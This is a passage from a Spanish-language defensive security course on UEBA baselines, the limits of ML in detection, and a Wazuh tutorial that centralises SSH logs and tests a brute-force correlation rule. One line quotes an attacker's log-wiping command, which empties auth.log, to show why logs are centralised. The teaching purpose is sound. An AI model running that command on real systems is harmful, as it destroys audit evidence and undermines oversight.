1. **Perfil temporal (Horario habitual):** El modelo aprende que la usuaria `mgomez` del área contable inicia sesión de lunes a viernes entre las 08:30 y las 18:00 hs, con actividad casi nula los fines de semana.
2. **Perfil de origen y ubicación:** Aprende que `mgomez` se conecta siempre desde la subred de finanzas (`10.10.25.0/26`) o desde proveedores de Internet residenciales dentro de su misma provincia o país.
3. **Perfil de acceso a activos (Pares y servidores):** Registra que su cuenta interactúa diariamente con el servidor `ERP` y el servidor de archivos financieros, pero **nunca** se ha conectado al servidor de repositorios de código fuente ni ha ejecutado comandos en servidores Linux.
4. **Perfil volumétrico:** Calcula el promedio y la desviación estándar de los datos que transfiere por día (por ejemplo, entre 15 MB y 80 MB diarios de documentos ofimáticos).

Cuando ocurre una actividad que rompe simultáneamente varias de esas líneas base —por ejemplo, la cuenta `mgomez` inicia sesión un martes a las 03:40 AM, accede por primera vez en su historia al servidor de ingeniería y descarga 15 GB de archivos comprimidos—, el modelo estadístico no bloquea necesariamente la cuenta de inmediato, sino que suma **puntos de anomalía** hasta superar un umbral de **Puntuación de Riesgo (_Risk Score_)** (por ejemplo, `92/100`) y genera una alerta de desviación de comportamiento para que el analista la investigue.

### Límites estrictos del Machine Learning en ciberseguridad (Core Crítico)

El mercado tecnológico actual suele promocionar las herramientas con "Inteligencia Artificial" como soluciones capaces de detener cualquier amenaza sin intervención humana. En la ingeniería de seguridad real —y especialmente al administrar los recursos de una pequeña empresa, creer en esa promesa conduce a errores graves de diseño y a presupuestos desperdiciados.

Todo responsable de infraestructura debe conocer las cuatro limitaciones técnicas ineludibles del Aprendizaje Automático en detección:

> [!CRITICAL:Anomalía estadística NO es sinónimo de ataque malicioso]
> Un algoritmo de Machine Learning no comprende qué es un delito ni qué es el negocio de tu empresa; **solo mide rareza matemática**. En las operaciones diarias de una PyME, ocurren decenas de cosas inusuales todas las semanas que son perfectamente legítimas: el cierre de balances anuales a medianoche, un directivo que viaja de vacaciones al exterior y revisa su correo desde el aeropuerto, o el administrador de sistemas migrando una carpeta de 200 GB un sábado por la tarde. Para el modelo matemático, todas esas acciones pueden ser anomalías y dispararán alertas, generando una **alta tasa de falsos positivos** que exige siempre a un ser humano con contexto del negocio para validarlas.

:::group title="Limitaciones operativas de los modelos ML / UEBA"

- **1. El mito del 100% de detección de ataques de día cero (_Zero-Day_)** : Ningún modelo de Machine Learning garantiza detectar el 100% de las amenazas desconocidas. Si un atacante comprometió una cuenta y se toma el trabajo de actuar lentamente dentro del horario de oficina, descargando pocos archivos por día hacia un servicio común, su actividad quedará camuflada dentro del margen estadístico normal del usuario (Falso Negativo). El ML no reemplaza el _hardening_ de los sistemas, la segmentación de red ni las reglas deterministas básicas.
- **2. Entrenamiento en entornos contaminados (_Data Poisoning_ / Línea base sucia)** : Un modelo no supervisado asume que lo que observa durante sus primeras semanas de aprendizaje es el estado "sano y normal" de la empresa. Si se activa el aprendizaje automático en una red que ya tiene un código malicioso que se comunica con un servidor externo o donde los administradores comparten cuentas a cualquier hora, el algoritmo aprenderá que esa actividad maliciosa es la normalidad y nunca alertará sobre ella.
- **3. Opacidad del modelo (_Black-Box Problem_)**: Cuando se dispara una regla determinista (como el ejemplo anterior de una regla Sigma), cualquier analista de seguridad puede saber exactamente qué pasó. En cambio, cuando un modelo complejo de redes neuronales o aislamiento estadístico dispara una alerta sin explicar de forma clara qué variables concretas motivaron ese puntaje, un analista puede llegar a pasar mucho tiempo intentando adivinar qué buscaba la herramienta.
- **4. Costo computacional y fatiga de mantenimiento**: Procesar series temporales e historiales de comportamiento de cientos de variables en tiempo real consume mucha más memoria RAM y procesador que evaluar reglas simples de coincidencia de texto.
  :::

### Escalonamiento: De la visibilidad nativa al SIEM centralizado

Montar un clúster de varios servidores dedicados para correr un SIEM empresarial con motores de Machine Learning requiere licencias o hardware costoso y, sobre todo, personal técnico disponible todas las mañanas para leer y ajustar el tablero. Siguiendo un criterio de madurez progresiva, la centralización debe escalonarse de acuerdo con la realidad de la organización:

| Nivel de Madurez                                                                                        | Objetivo Operativo                                                                                                                                          | Qué herramientas y controles implementar                                                                                                                                                                                                                                                                                                                                                                                                                             |
| :------------------------------------------------------------------------------------------------------ | :---------------------------------------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Nivel Base (CIS IG1)**<br><br>_(Empresa pequeña sin equipo de seguridad dedicado)_                    | Evitar que un atacante borre sus huellas localmente y aprovechar las alertas de comportamiento que ya vienen incluidas gratis en los servicios contratados. | **1. En la nube:** Activar y revisar las alertas nativas de inicio de sesión riesgoso y anomalías de identidad que ya traen integradas Microsoft Entra ID / Microsoft 365 o Google Workspace.<br><br>**2. En servidores locales:** Configurar el reenvío nativo de registros (`rsyslog` en Linux o Suscripciones de Eventos `WEF` en Windows) desde los servidores críticos hacia un único servidor interno protegido, sin necesidad de instalar aún un SIEM pesado. |
| **Nivel Intermedio (CIS IG2)**<br><br>_(PyME estructurada con responsable de TI/Seguridad)_             | Centralizar formalmente todos los _logs_ de auditoría y alertas en un único panel con reglas de correlación deterministas.                                  | Desplegar una plataforma SIEM unificada de código abierto (Wazuh junto a OpenSearch, o el stack de Elastic Security) o comercial en la nube (Microsoft Sentinel, **Splunk). Conectar agentes de servidores, cortafuegos y sensores de red (`Suricata`/`Zeek`), garantizando retención mínima de 90 días y reglas de correlación para cuentas válidas.                                                                                                                |
| **Nivel Avanzado (CIS IG3)**<br><br>_(Organización con operación continua o datos críticos regulados)_  | Incorporar detección estadística de anomalías (`UEBA` / `ML`), ajuste continuo de umbrales y correlación cruzada de alta fidelidad.                         | Con las reglas deterministas ya estables y depuradas, habilitar los módulos de detección de anomalías / `UEBA` sobre los índices de autenticación y transferencia de datos para detectar exfiltraciones silenciosas y desviaciones de horario o volumen.                                                                                                                                                                                                             |
| _Hoja de ruta progresiva para centralizar registros y adoptar correlación y análisis de comportamiento_ |                                                                                                                                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |

### 5.4.1. Centralización en práctica <!-- id: siem-correlacion-practica, icon: ToolsIcon, displayTitle: 05.4.1 — Práctica: Centralización y Reglas de Correlación, description: Tutorial para centralizar eventos y probar reglas de correlación con Wazuh SIEM. -->

En esta subsección aprenderás a llevar a la práctica los dos pilares de la detección centralizada:

1. **Centralización (De local a remoto):** Cómo hacer que los registros de auditoría salgan automáticamente del equipo donde se originan y viajen hacia el SIEM central, evitando que un atacante borre sus huellas.
2. **Correlación determinista (De ruido a incidente real):** Cómo escribir y verificar una regla inteligente que detecte un ataque de fuerza bruta SSH (`MITRE ATT&CK T1110`), diferenciando un simple fallo de contraseña aislado de una intrusión activa en tiempo real.

Para que la práctica sea 100% segura y realizable desde el primer minuto, utilizaremos la herramienta oficial integrada **`wazuh-logtest`**. Este simulador nativo de Wazuh permite probar decodificadores y reglas de correlación temporal de forma inmediata, sin necesidad de atacar servidores reales ni arriesgar infraestructura de producción.

:::steps

### 1. El punto de partida: El registro local en el host

En cualquier servidor Linux, cada intento de autenticación SSH genera una línea en el archivo de registro local `/var/log/auth.log` (o en el Visor de Eventos de Windows).

Cuando un atacante intenta adivinar contraseñas, el servicio genera líneas crudas como esta:

```text:log-crudo
Nov  7 14:20:10 srv-app sshd[1245]: Failed password for invalid user admin from 192.168.1.150 port 43120 ssh2
```

Si este registro permanece únicamente guardado en el disco del propio servidor (`srv-app`), un intruso que consiga acceder solo necesita ejecutar `cat /dev/null > /var/log/auth.log` para destruir la evidencia. Por eso, el primer paso indispensable es la **centralización inmediata**.

### 2. Centralizar el registro hacia el SIEM

Para centralizar eventos con el agente de Wazuh (`wazuh-agent`), basta con indicarle qué archivo debe vigilar y transmitir en tiempo real. En el equipo que deseas supervisar, añade la directiva `<localfile>` dentro de su archivo de configuración `/var/ossec/etc/ossec.conf`:

```xml:/var/ossec/etc/ossec.conf
<ossec_config>
  <!-- Centralizacion continua de registros de autenticacion -->
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/auth.log</location>
  </localfile>
</ossec_config>
```

Reinicia el servicio del agente para aplicar la directiva:

```bash:terminal
sudo systemctl restart wazuh-agent
```

**¿Qué logramos con esto?**
El agente lee cada nueva línea en `/var/log/auth.log` en el milisegundo en que se escribe, la cifra y la envía por la red hacia el **Wazuh Manager** (puerto `1514 TCP`). Aunque el atacante apague o manipule el servidor local más tarde, la evidencia ya quedó resguardada de forma inalterable en el colector central.

### 3. Inspeccionar cómo el SIEM decodifica el evento

Cuando el texto crudo llega al servidor central, el SIEM no puede trabajar con texto plano desordenado; necesita extraer los campos clave (Fase de Parsing y Normalización). Para comprobar cómo interpreta Wazuh este evento sin necesidad de enviar tráfico de red real, abrimos en el servidor central la herramienta oficial de prueba:

```bash:terminal
sudo /var/ossec/bin/wazuh-logtest
```

Cuando aparezca el mensaje `Type one log per line`, pega la línea de registro que obtuvimos en el Paso 1:

```text:entrada-logtest
Nov  7 14:20:10 srv-app sshd[1245]: Failed password for invalid user admin from 192.168.1.150 port 43120 ssh2
```

El simulador mostrará cómo el motor procesa el evento en tres fases automáticas:

```text:salida-logtest-fase1-2
**Phase 1: Completed pre-decoding.
    program_name: 'sshd'

**Phase 2: Completed decoding.
    name: 'sshd'
    dstuser: 'admin'
    srcip: '192.168.1.150'

**Phase 3: Completed filtering (rules).
    id: '5716'
    level: '5'
    description: 'SSHD authentication failed.'
```

**Diagnóstico del analista:**

- El SIEM extrajo con éxito el usuario destino (`dstuser: admin`) y la IP atacante (`srcip: 192.168.1.150`).
- Activó la **regla base 5716** con nivel de severidad `5` (bajo).
- Un único fallo aislado es común (un usuario legítimo puede equivocarse al escribir su clave). Por eso el SIEM no genera pánico. La solución es agregar **correlación temporal**.

> outcome: Registro crudo normalizado en campos estructurados y clasificado bajo la regla base de fallo SSH

### 4. Crear la Regla de Correlación temporal (75%)

Definiremos una regla de correlación clara: **si una misma dirección IP acumula 5 fallos de autenticación en menos de 60 segundos**, el SIEM debe reconocer el patrón de fuerza bruta y disparar una **alerta de severidad alta (nivel 10)**.

Abre el archivo de reglas locales en el servidor central:

```bash:terminal
sudo nano /var/ossec/etc/rules/local_rules.xml
```

Agrega el siguiente bloque de regla dentro de la sección `<group name="local,sshd,">`:

```xml:/var/ossec/etc/rules/local_rules.xml
<group name="local,sshd,">

  <!-- Regla de Correlacion: 5 fallos SSH en 60 segundos desde la misma IP -->
  <rule id="100050" level="10" frequency="5" timeframe="60">
    <if_matched_sid>5716</if_matched_sid>
    <same_source_ip />
    <description>LILIUM-SIEM: Ataque de fuerza bruta SSH detectado (5 fallos en menos de 60s desde la misma IP).</description>
    <mitre>
      <id>T1110</id>
    </mitre>
  </rule>

</group>
```

**¿Cómo funciona cada parámetro de la regla?**

1. **`frequency="5"` y `timeframe="60"`:** Le ordenan al motor mantener un contador en memoria durante una ventana de 60 segundos.
2. **`<if_matched_sid>5716</if_matched_sid>`:** Enlaza la regla base de fallo que vimos en el paso anterior.
3. **`<same_source_ip />`:** Garantiza que los 5 intentos provengan de la **misma dirección IP**. Si cinco empleados diferentes fallan su clave una vez en toda la oficina, no habrá falsa alarma; si una sola IP falla 5 veces, la condición se cumple.
4. **`level="10"` y `<mitre><id>T1110</id></mitre>`:** Eleva la alerta a severidad operativa alta y la etiqueta automáticamente bajo la técnica MITRE ATT&CK correspondiente.

> outcome: Regla de correlación `100050` configurada con memoria temporal y condición por dirección IP de origen

### 5. Probar y verificar la correlación de 0 a 100 (100%)

Inicia nuevamente el simulador para comprobar la correlación en acción:

```bash:terminal
sudo /var/ossec/bin/wazuh-logtest
```

Pega la misma línea de fallo SSH **4 veces consecutivas**:

```text:log-prueba
Nov  7 14:20:10 srv-app sshd[1245]: Failed password for invalid user admin from 192.168.1.150 port 43120 ssh2
```

En las primeras 4 líneas, verás que el SIEM responde siempre con la regla base `5716` (severidad 5). El sistema recuerda la secuencia en memoria, pero aún no dispara la alarma.

Ahora ingresa la línea por **quinta vez**:

```text:salida-correlacionada
**Phase 3: Completed filtering (rules).
    id: '100050'
    level: '10'
    description: 'LILIUM-SIEM: Ataque de fuerza bruta SSH detectado (5 fallos en menos de 60s desde la misma IP).'
    groups: '["local","sshd"]'
    firedtimes: '1'
    mitre.id: '["T1110"]'
**Alert to be generated.
```

¡Correlación verificada con éxito! El SIEM evaluó el historial temporal reciente, identificó la recurrencia desde `192.168.1.150` y disparó la alerta crítica `100050` junto con su indicador MITRE ATT&CK.

> outcome: Correlación completada de 0 a 100; el motor transformó múltiples eventos rutinarios en una alerta de seguridad de alta fidelidad

### 6. Inspección de la alerta estructurada y respuesta activa

Una vez verificada la regla en el simulador, aplica la configuración reiniciando el servicio central (`sudo systemctl restart wazuh-manager`).

Cuando la regla se active con tráfico real, el SIEM generará un evento estructurado en `/var/ossec/logs/alerts/alerts.json` y lo reflejará en el panel de Wazuh Dashboard. Puedes auditarlo al instante desde la terminal con `jq`:

```bash:terminal
sudo tail -n 20 /var/ossec/logs/alerts/alerts.json | jq 'select(.rule.id == "100050") | {hora: .timestamp, ip_atacante: .data.srcip, usuario_objetivo: .data.dstuser, severidad: .rule.level, descripcion: .rule.description}'
```

**Cierre del circuito defensivo:**
Con esta única alerta estructurada, el equipo de seguridad o un script de **Respuesta Activa** (`active-response`) puede bloquear de inmediato la IP `192.168.1.150` en el firewall durante 60 minutos, neutralizando la intrusión de manera automatizada.

> outcome: Alerta disponible en formato estructurado JSON, lista para triaje visual o contención automatizada en el firewall
> :::

> [!TIP:Centralización sin agente para firewalls y switches (Syslog nativo)]
> Si necesitas centralizar registros desde dispositivos de red donde no es posible instalar un agente de Wazuh (como cortafuegos perimetrales, routers o switches), Wazuh Manager incluye un receptor Syslog nativo por red. Basta con configurar en el equipo de red el reenvío de logs hacia la dirección IP del servidor Wazuh por el puerto `514 UDP` o `TCP`. Los decodificadores y las reglas de correlación procesarán esos registros de la misma forma que si provinieran de un agente local.

> [!TIP:Dónde activar la detección de anomalías (ML) en Wazuh / OpenSearch]
> Si ya tienes el panel gráfico de **Wazuh Dashboard** (basado en OpenSearch) recibiendo estos eventos y deseas experimentar con el nivel **IG3**, no necesitas programar algoritmos desde cero. Dentro del menú lateral del panel gráfico encontrarás la sección **OpenSearch Plugins → Anomaly Detection**. Allí puedes crear un detector visual que observe el índice `wazuh-alerts-*` contando la frecuencia de eventos por usuario o el volumen de bytes en `conn.log` en intervalos de 10 minutos; el motor entrenará automáticamente un modelo estadístico (_Random Cut Forest_) sobre tus datos históricos y marcará en una gráfica cualquier pico anormal que se aparte del comportamiento habitual de tu PyME.

#### Aplicación práctica en una PyME y recursos oficiales

La combinación de centralización y reglas de correlación deterministas ofrece el mayor retorno operativo para una pequeña o mediana empresa:

- **Protección contra borrado de huellas:** Al extraer los eventos en el mismo segundo en que se generan, ningún atacante puede esconder su intrusión eliminando archivos de texto locales.
- **Reducción de fatiga de alertas:** Exigir ventanas de tiempo (`timeframe`) y comprobación de origen (`same_source_ip`) filtra los errores comunes de los usuarios y enfoca la atención del equipo únicamente en patrones maliciosos reales.
- **Base sólida para escalar:** Con las reglas deterministas ya estables, se pueden activar detectores de anomalías estadísticas o modelos de Machine Learning sobre volúmenes y horarios sin saturar de falsos positivos las operaciones del negocio.

Para consultar más ejemplos de decodificadores y reglas oficiales de Wazuh:

- [Documentación oficial de reglas de Wazuh](https://documentation.wazuh.com/current/user-manual/ruleset/index.html): Guía completa de sintaxis XML, variables y opciones de correlación.
- [Repositorio de reglas y decodificadores en GitHub](https://github.com/wazuh/wazuh-ruleset): Catálogo comunitario con miles de reglas listas para usar ordenadas por servicio y fabricante.

### Verificación rápida de la subsección

Antes de avanzar hacia el estudio de la inteligencia de amenazas e indicadores en `05.5`, confirma mediante esta lista de control que los fundamentos de centralización y correlación han quedado correctamente establecidos en tu entorno:

:::steps

### 1. Resguardo externo de registros contra el borrado de huellas

Verifica que ningún servidor crítico almacene sus registros de autenticación e integridad únicamente en su propio disco local. Comprueba que el reenvío por red (mediante `rsyslog`, Suscripciones de Eventos de Windows o el agente del SIEM) esté activo y entregando eventos a un colector separado donde el administrador del servidor origen no tenga permisos de borrado.

### 2. Sincronización horaria uniforme en todas las fuentes

Ejecuta `timedatectl status` en tus servidores Linux y `w32tm /query /status` en tus equipos Windows para confirmar que todos tengan el servicio `NTP` sincronizado y compartan la misma zona horaria (preferentemente `UTC` para los registros internos), garantizando que las reglas de correlación temporal funcionen con precisión.

### 3. Priorización de reglas deterministas

Confirma que tu arquitectura de monitoreo cuente primero con reglas deterministas claras y probadas para los casos de alto impacto (creación de cuentas administrativas, vaciado de registros de auditoría, inicios de sesión exitosos tras múltiples fallos y modificaciones de archivos críticos en FIM), tratando cualquier módulo estadístico de `ML` o `UEBA` como un complemento analítico secundario sujeto a validación humana.
:::
